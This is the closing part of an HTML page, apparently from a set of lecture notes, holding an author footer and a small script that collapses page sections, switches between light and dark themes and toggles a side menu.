   <div class="col-xs-1"></div>
</div> <!-- end row -->

<div class="row top-buffer"> </div>

<div class="row top-buffer"> </div>

<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><hr style="border: 1px solid #FFFFFF" />   </div>
   <div class="col-xs-1"></div>
</div> <!-- end row -->
<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><footer id="postamble">
<div>
<p class="author"><b>Author</b>: Leonardo Tamiano</p><p class="email"><b>Email</b>: <a href="mailto:leonardotamiano95@gmail.com">leonardotamiano95@gmail.com</a></p><p class="date"><b>Created</b>: 2021-08-10 mar 02:28</p>
</div>
</footer>
   </div>
   <div class="col-xs-1"></div>
</div> <!-- end row -->
<div class="row top-buffer"> </div>

<div class="row top-buffer"> </div>

<div class="row top-buffer"> </div>
<script>

      function set_sections() {
	// -- Deal with the hiding/showing of the various sections
	var buttons = document.getElementsByClassName('collapsible');

	for (var i = 0; i < buttons.length; i++) {
	  buttons[i].addEventListener('click', function() {
	    var content = this.parentElement;
	    divs = content.getElementsByTagName('div');
	    for (var j = 0; j < divs.length; j++) {
	      if (divs[j].style.display === '' || divs[j].style.display === 'block') {
		divs[j].style.display = 'none';
	      } else {
		divs[j].style.display = 'block';
	      }
	    }
	  });
	}
      }

      function hide_sections() {
	// -- Deal with the hiding/showing of the various sections
	var buttons = document.getElementsByClassName('collapsible');
	var sections_to_not_hide = ['Lecture Info', 'Overview', 'Basic Info', 'Informazioni Lezione', 'Table of Contents', 'Informazioni']

	for (var i = 0; i < buttons.length; i++) {
	  // -- Check which sections to hide initially
	  html_elem = buttons[i].getElementsByTagName('h2').length > 0 ?
	    buttons[i].getElementsByTagName('h2')[0] :
	    buttons[i].getElementsByTagName('h3').length > 0 ?
	    buttons[i].getElementsByTagName('h3')[0] :
	    buttons[i].getElementsByTagName('h4')[0];

	  var hide_section = true;

	  for (var h = 0; h < sections_to_not_hide.length; h++) {
	    if (html_elem.innerHTML.includes(sections_to_not_hide[h])) {
	      hide_section = false;
	    }
	  }

	  if (hide_section) {
	    divs = buttons[i].parentElement.getElementsByTagName('div');

	    for (var j = 0; j < divs.length; j++) {
	      divs[j].style.display =
		divs[j].style.display === '' || divs[j].style.display === 'block' ?
		divs[j].style.display = 'none' :
		divs[j].style.display = 'block';
	    }
	  }    
	}
      }

      // ---------------------------

      // function to set a given theme/color-scheme
      function setTheme(themeName) {
        localStorage.setItem('theme', themeName);
        document.documentElement.className = themeName;
      }

      // function to toggle between light and dark theme
      function toggleTheme() {
        if (localStorage.getItem('theme') === 'theme-dark') {
          setTheme('theme-light');
        } else {
          setTheme('theme-dark');
        }
      }

      // Immediately invoked function to set the theme on initial load
      (function () {
        if (localStorage.getItem('theme') === 'theme-light') {
          setTheme('theme-light');
        } else {
          setTheme('theme-dark');
        }
      })();
      

      // ---------------------------

      // toggle menu
      var menu_off = 1
      
      function toggleMenu() {
	let menu = document.querySelector('.side-menu');
	let menu_list = document.querySelector('.side-menu-content');
	let toggle = document.querySelector('.toggle');

	let inactive_color = getComputedStyle(document.body)
	    .getPropertyValue('--color-background');

	let active_color = getComputedStyle(document.body)
	    .getPropertyValue('--color-primary');	
		
	if (menu_off) {
	  // activate menu
	  toggle.style.backgroundColor = active_color;
	  menu.style.width = '170px';
	  menu_list.style.display = 'block';
	  menu_off = 0;
	} else {
	  // de-activate menu
	  toggle.style.backgroundColor = inactive_color;
	  menu.style.width = '60px';	  
	  menu_list.style.display = 'none';
	  menu_off = 1;
	}
      }

set_sections();
hide_sections();
</script>
</div>
</body>
</html>
